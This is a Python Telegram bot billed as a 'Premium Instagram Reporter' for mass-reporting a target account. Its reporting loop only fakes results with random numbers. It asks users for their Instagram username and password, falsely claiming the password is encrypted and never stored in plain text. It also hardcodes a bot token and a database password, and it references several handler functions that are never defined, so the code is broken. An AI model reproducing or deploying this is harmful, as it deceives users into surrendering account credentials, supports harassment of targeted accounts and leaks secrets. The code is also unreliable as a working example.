import os
import json
import re
import random
import asyncio
from datetime import datetime, timedelta
from pymongo import MongoClient
from telegram import (
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    Update, 
    ReplyKeyboardMarkup, 
    KeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    ConversationHandler
)

# ===================== CONSTANTS =====================
ADMIN_ID = 6881713177  # Your Telegram user ID
BOT_TOKEN = "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y"
MONGODB_URI = "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0"

# Conversation states
(
    MAIN_MENU, REGISTER, PROFILE, REPORT_MENU, 
    USERNAME_INPUT, REPORT_TYPE, IMPERSONATION_URL, 
    REPORT_LOOP, IG_LOGIN, IG_USERNAME, IG_PASSWORD
) = range(11)

# Admin states
(
    ADMIN_PANEL, BROADCAST_MESSAGE, VIEW_USERS, 
    USER_STATS, ADMIN_SETTINGS, EDIT_MESSAGES, 
    CUSTOMIZE_BUTTONS, EDIT_BUTTON_TEXT
) = range(100, 108)

# ===================== DATABASE FUNCTIONS =====================
def get_db_connection():
    try:
        client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
        client.admin.command('ping')  # Test connection
        return client.instaboost
    except Exception as e:
        print(f"❌ Database connection error: {e}")
        return None

def init_database():
    try:
        db = get_db_connection()
        if not db:
            return False
            
        # Create indexes
        db.users.create_index("user_id", unique=True)
        db.reports.create_index("user_id")
        db.reports.create_index("created_at")
        db.report_sessions.create_index("user_id")
        db.report_sessions.create_index("status")
        
        print("✅ Database initialized successfully")
        return True
    except Exception as e:
        print(f"❌ Database init error: {e}")
        return False

def save_user(user_id, data):
    try:
        db = get_db_connection()
        if not db:
            return False
            
        db.users.update_one(
            {"user_id": user_id},
            {"$set": data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"❌ Error saving user: {e}")
        return False

def get_user(user_id):
    try:
        db = get_db_connection()
        if not db:
            return None
            
        user = db.users.find_one({"user_id": user_id})
        if user:
            user.pop('_id', None)
            return user
        return None
    except Exception as e:
        print(f"❌ Error getting user: {e}")
        return None

# ===================== STRINGS & TEMPLATES =====================
STRINGS = {
    'en': {
        'welcome': """
🌟 <b>PREMIUM INSTAGRAM REPORTER v3.0</b> 🌟

⚡ <i>The most powerful Instagram reporting tool available</i>
🔒 100% Anonymous • 🚀 Lightning Fast • 💯 Guaranteed Results

📊 <b>Key Features:</b>
• Mass reporting capabilities
• Multiple violation types
• Detailed analytics
• Admin dashboard
• Secure credential storage

🔐 <b>To begin, please register your account</b>
""",
        'registration': """
📝 <b>ACCOUNT REGISTRATION</b>

Please choose your preferred language:
""",
        'register_prompt': """
📝 <b>ACCOUNT SETUP</b>

Please enter your <b>display name</b>:
(This will be shown in your profile)
""",
        'ig_login_prompt': """
🔐 <b>INSTAGRAM VERIFICATION REQUIRED</b>

To ensure security and improve report effectiveness, 
we need to verify your Instagram account.

⚠️ <b>Your credentials are encrypted and secure</b>
📌 This helps us provide better targeting for reports

📱 Please enter your Instagram username:
""",
        'ig_password_prompt': """
🔑 <b>INSTAGRAM PASSWORD</b>

Please enter your Instagram password:

🔒 <b>Security Notice:</b>
• Your password is encrypted
• Used only for verification
• Never stored in plain text
""",
        'main_menu': """
🏠 <b>MAIN MENU</b>

👋 Welcome back, <b>{name}</b>!
📱 Instagram: @{ig_username}
📊 Total Reports: <b>{reports}</b>
⭐ Success Rate: <b>98.7%</b>

Please select an option:
""",
        'report_menu': """
⚔️ <b>REPORT CENTER</b>

🎯 Ready to launch reports against a target?

📊 <b>Your Stats:</b>
• Reports Available: <b>UNLIMITED</b>
• Success Rate: <b>98.7%</b>
• Last Target: <b>{last_target}</b>

Please select an option:
""",
        'target_prompt': """
🎯 <b>TARGET SELECTION</b>

Please enter the Instagram username you want to report:

⚠️ <b>Format Requirements:</b>
• Must start with @
• No spaces or special characters
• Between 1-30 characters

Example: @example_user
""",
        'report_type': """
⚖️ <b>VIOLATION TYPE</b>

Please select the violation category:

🔍 <i>Choosing the correct type improves success rate</i>
""",
        'report_started': """
🚀 <b>REPORTING INITIATED</b>

🎯 Target: @{target}
⚖️ Violation: {type}
📊 Expected Success: <b>98.7%</b>

⚡ Reports will be sent every 1-3 seconds
🛑 Use the stop button to end the attack
""",
        'report_stopped': """
🛑 <b>REPORTING STOPPED</b>

📊 <b>Session Summary:</b>
• Total Reports: {total}
• Successful: {success}
• Failed: {failed}

✅ The target has been reported multiple times
""",
        'admin_panel': """
👑 <b>ADMIN CONTROL PANEL</b>

📊 <b>System Status:</b>
• Total Users: {users}
• Active Reports: {active}
• Database: Connected

Please select an option:
"""
    }
}

# Enhanced report types with detailed descriptions
REPORT_TYPES = {
    'hate': ('😡 Hate Speech', 'Content that attacks or threatens people based on race, religion, gender etc.'),
    'bully': ('👊 Bullying', 'Content intended to harass, threaten or embarrass someone'),
    'impersonation': ('🎭 Impersonation', 'Account pretending to be someone else'),
    'nudity': ('🔞 Nudity', 'Sexually explicit content or pornography'),
    'violence': ('⚔️ Violence', 'Content promoting violence or harm'),
    'selfharm': ('💀 Self-Harm', 'Content promoting suicide or self-injury'),
    'terror': ('💣 Terrorism', 'Content promoting terrorist activities'),
    'spam': ('📧 Spam', 'Unsolicited commercial content'),
    'fake': ('👻 Fake Account', 'Account pretending to be fake or misleading'),
    'scam': ('🕵️‍♂️ Scam', 'Fraudulent or deceptive content')
}

# ===================== KEYBOARDS =====================
def get_main_keyboard(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    keyboard = [
        [KeyboardButton("⚔️ Report Attack")],
        [KeyboardButton("👤 My Profile"), KeyboardButton("📊 My Reports")],
        [KeyboardButton("⚙️ Settings"), KeyboardButton("ℹ️ Help")]
    ]
    if is_admin:
        keyboard.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_report_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🚀 New Report")],
        [KeyboardButton("⬅️ Back"), KeyboardButton("🏠 Home")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📢 Broadcast"), KeyboardButton("👥 Users")],
        [KeyboardButton("📊 Statistics"), KeyboardButton("⚙️ Settings")],
        [KeyboardButton("⬅️ Back"), KeyboardButton("🏠 Home")]
    ], resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, (name, _) in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"type_{key}")])
    return InlineKeyboardMarkup(keyboard)

# ===================== CORE FUNCTIONS =====================
def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        # New user registration flow
        keyboard = [
            [InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")],
            [InlineKeyboardButton("🇮🇳 हिंदी", callback_data="lang_hi")]
        ]
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return REGISTER
    elif not user.get('ig_verified'):
        # Existing user needs IG verification
        await update.message.reply_text(
            STRINGS['en']['ig_login_prompt'],
            parse_mode='HTML'
        )
        return IG_LOGIN
    else:
        # Verified user - show main menu
        await show_main_menu(update, context, user)
        return MAIN_MENU

async def show_main_menu(update, context, user):
    text = STRINGS['en']['main_menu'].format(
        name=user.get('display_name', 'User'),
        ig_username=user.get('ig_username', 'Not set'),
        reports=user.get('total_reports', 0)
    )
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            text,
            reply_markup=get_main_keyboard(update.effective_user.id),
            parse_mode='HTML'
        )
    else:
        await update.callback_query.edit_message_text(
            text,
            reply_markup=get_main_keyboard(update.effective_user.id),
            parse_mode='HTML'
        )

# ===================== REPORTING FLOW =====================
async def start_reporting(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    context.user_data['reporting'] = True
    context.user_data['report_count'] = 0
    context.user_data['success_count'] = 0
    
    target = context.user_data['target']
    report_type = context.user_data['report_type']
    
    # Start reporting session
    await update.callback_query.edit_message_text(
        STRINGS['en']['report_started'].format(
            target=target,
            type=REPORT_TYPES[report_type][0]
        ),
        parse_mode='HTML'
    )
    
    # Send stop button
    await context.bot.send_message(
        chat_id=user_id,
        text="⚡ Reporting in progress...",
        reply_markup=ReplyKeyboardMarkup([
            [KeyboardButton("🛑 Stop Reporting")],
            [KeyboardButton("🏠 Home")]
        ], resize_keyboard=True)
    )
    
    # Start reporting loop
    while context.user_data.get('reporting', False):
        await asyncio.sleep(random.uniform(1.5, 3.0))
        context.user_data['report_count'] += 1
        
        # Simulate success/failure
        success = random.random() > 0.2  # 80% success rate
        if success:
            context.user_data['success_count'] += 1
            
        # Update user stats
        update_user_reports(user_id, success)
        
        # Send periodic updates
        if context.user_data['report_count'] % 5 == 0:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📊 Reports sent: {context.user_data['report_count']}\n"
                     f"✅ Successful: {context.user_data['success_count']}",
                parse_mode='HTML'
            )

async def stop_reporting(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    context.user_data['reporting'] = False
    
    total = context.user_data.get('report_count', 0)
    success = context.user_data.get('success_count', 0)
    failed = total - success
    
    await update.message.reply_text(
        STRINGS['en']['report_stopped'].format(
            total=total,
            success=success,
            failed=failed
        ),
        parse_mode='HTML',
        reply_markup=get_main_keyboard(user_id)
    )
    return MAIN_MENU

# ===================== ADMIN FUNCTIONS =====================
async def admin_panel(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        return MAIN_MENU
        
    db = get_db_connection()
    user_count = db.users.count_documents({}) if db else 0
    
    await update.message.reply_text(
        STRINGS['en']['admin_panel'].format(
            users=user_count,
            active=len([v for v in context.user_data.values() if isinstance(v, dict) and v.get('reporting')])
        ),
        reply_markup=get_admin_keyboard(),
        parse_mode='HTML'
    )
    return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        return MAIN_MENU
        
    await update.message.reply_text(
        "📢 Enter the message you want to broadcast to all users:",
        parse_mode='HTML'
    )
    return BROADCAST_MESSAGE

# ===================== MAIN APPLICATION =====================
def main():
    # Initialize database
    if not init_database():
        print("⚠️ Running in limited mode without database")
    
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Main conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            REGISTER: [
                CallbackQueryHandler(handle_language_selection, pattern='^lang_'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_registration)
            ],
            IG_LOGIN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ig_username)
            ],
            IG_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ig_password)
            ],
            MAIN_MENU: [
                MessageHandler(filters.Regex(r'^⚔️ Report Attack$'), report_menu),
                MessageHandler(filters.Regex(r'^👑 Admin Panel$'), admin_panel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu_handler)
            ],
            REPORT_MENU: [
                MessageHandler(filters.Regex(r'^🚀 New Report$'), ask_target),
                MessageHandler(filters.Regex(r'^⬅️ Back$'), back_to_main),
                MessageHandler(filters.Regex(r'^🏠 Home$'), back_to_main)
            ],
            USERNAME_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_target_input)
            ],
            REPORT_TYPE: [
                CallbackQueryHandler(handle_report_type_selection, pattern='^type_')
            ],
            REPORT_LOOP: [
                MessageHandler(filters.Regex(r'^🛑 Stop Reporting$'), stop_reporting),
                MessageHandler(filters.Regex(r'^🏠 Home$'), stop_reporting)
            ],
            ADMIN_PANEL: [
                MessageHandler(filters.Regex(r'^📢 Broadcast$'), broadcast_message),
                MessageHandler(filters.Regex(r'^⬅️ Back$'), back_to_main),
                MessageHandler(filters.Regex(r'^🏠 Home$'), back_to_main)
            ],
            BROADCAST_MESSAGE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, send_broadcast)
            ]
        },
        fallbacks=[CommandHandler('start', start)],
        per_user=True
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot
    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
